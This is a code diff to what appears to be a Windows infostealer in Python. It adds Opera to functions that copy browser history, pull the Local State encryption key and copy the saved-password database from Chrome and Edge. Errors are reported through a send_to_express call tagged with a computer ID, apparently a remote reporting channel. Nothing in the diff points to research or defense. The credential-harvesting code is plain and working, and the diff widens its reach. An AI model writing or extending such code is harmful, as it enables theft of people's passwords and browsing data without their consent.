@@ -531,11 +531,13 @@ def get_browser_history(browser="chrome", limit=10):
     try:
         if browser == "edge":
             history_db = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
+        elif browser == "opera":
+            history_db = os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable\Default\History')
         else:
             history_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
 
         if not os.path.exists(history_db):
-            raise FileNotFoundError(f"❌ History file not found: {history_db}")
+            raise FileNotFoundError(f"History file not found: {history_db}")
         
         history_copy = history_db + "_copy"
         shutil.copy2(history_db, history_copy)
@@ -556,18 +558,20 @@ def get_browser_history(browser="chrome", limit=10):
         return history_list
 
     except Exception as e:
-        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error inget_browser_history", custom_color=ERROR_COLOR, code_block=True)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_browser_history", custom_color=ERROR_COLOR, code_block=True)
         return []
 
 def get_encryption_key(browser="chrome"):
     try:
         if browser == "edge":
             local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State")
+        elif browser == "opera":
+            local_state_path = os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Local State")
         else:
             local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
         
         if not os.path.exists(local_state_path):
-            raise FileNotFoundError(f"❌ Local State file not found: {local_state_path}")
+            raise FileNotFoundError(f"Local State file not found: {local_state_path}")
 
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = json.load(f)
@@ -593,11 +597,13 @@ def get_browser_passwords(browser="chrome"):
     try:
         if browser == "edge":
             db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data")
+        elif browser == "opera":
+            db_path = os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Default\Login Data")
         else:
             db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
 
         if not os.path.exists(db_path):
-            raise FileNotFoundError(f"❌ Database file not found: {db_path}")
+            raise FileNotFoundError(f"Database file not found: {db_path}")
 
         temp_db = "LoginData.db"
         shutil.copy2(db_path, temp_db)
